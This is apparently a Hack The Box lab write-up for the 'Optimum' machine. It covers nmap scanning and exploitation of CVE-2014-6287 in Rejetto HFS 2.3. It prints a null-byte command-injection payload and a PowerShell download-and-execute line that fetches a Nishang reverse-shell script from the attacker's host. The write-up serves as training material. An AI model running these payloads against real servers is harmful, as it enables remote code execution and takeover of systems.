# Hack The Box - Optimum

```CSS
Machine IP: 10.10.10.8

Vulnerabilities:
  - Rejetto HTTP File Server 2.3: CVE-2014-6287 (w/o MetaSploit)
```

## NMAP
```CSS
▶ nmap -Pn -sS -p- 10.10.10.8 -T4 --min-rate 1000 -oN surface.nmap

Nmap scan report for 10.10.10.8
Host is up (0.18s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

```CSS
▶ nmap -sC -sV -p 80 10.10.10.8 -oN deep.nmap

Nmap scan report for 10.10.10.8
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## HTTP #80
![image](https://user-images.githubusercontent.com/83878909/235110690-0249d8ca-39e8-42c0-b237-2aab3e219a96.png)

### HTTP File Server 2.3
  - CVE-2014-6287 : The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aka HFS or HTTP Fileserver) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.

### Exploit
![image](https://user-images.githubusercontent.com/83878909/236133911-37a8b4c2-129c-4215-81f0-4b67efba6033.png)

#### Command Execution

```CSS
▶ tcpdump -i tun0
```
```CSS
%00{.exec|ping 10.10.14.21.}
```
![image](https://user-images.githubusercontent.com/83878909/236135355-c044f521-5cea-4d4c-abb3-95aafa954d6c.png)
![image](https://user-images.githubusercontent.com/83878909/236134669-802324a7-fbd7-4cf3-9cd8-6bc4c8336c04.png)

#### Reverse Shell (Nishang)

- `Invoke-PowerShellTcp.ps1`
![image](https://user-images.githubusercontent.com/83878909/236135960-4b5a97fd-8c54-4847-ac0e-f6e6c1dbed23.png)

  - Copy and Paste the line of code to the bottom of the sciript.
  - Edit the code.
![image](https://user-images.githubusercontent.com/83878909/236136805-0bc1601e-7bad-4b11-bad7-3206cf2f3dcd.png)
![image](https://user-images.githubusercontent.com/83878909/236137400-fad06366-6e40-4a1f-b0de-1f1d8831b9ff.png)

  - Upload the `Nishang` script.
  - Start a reverse `Netcat` listener.

```CSS
%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.21:8000/Invoke-PowerShellTcp.ps1').}
```
![image](https://user-images.githubusercontent.com/83878909/236139893-93d6cafd-91f1-4da8-94cc-4c2a5ca6079b.png)
![image](https://user-images.githubusercontent.com/83878909/236139759-484a70c3-ca74-4e01-9096-50befb2d0dc6.png)
